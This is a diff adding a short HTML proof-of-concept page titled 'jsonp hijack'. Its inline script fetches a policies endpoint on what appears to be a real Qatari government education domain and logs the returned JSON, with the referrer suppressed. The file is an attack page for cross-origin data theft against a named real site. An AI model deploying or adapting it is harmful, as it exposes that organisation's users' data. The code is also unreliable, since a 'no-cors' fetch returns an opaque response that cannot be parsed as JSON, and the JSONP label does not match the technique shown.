@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+    <meta name="referrer" content="never" charset="utf-8">
+    <title>jsonp hijack</title>
+</head>
+
+<body>
+  <script>
+   fetch("https://tms.edu.gov.qa/Policies/ReadPolicies", {mode:'no-cors'})
+  .then((response) => response.json())
+  .then((json) => console.log(json));
+  </script>
+</body>
+</html>
+
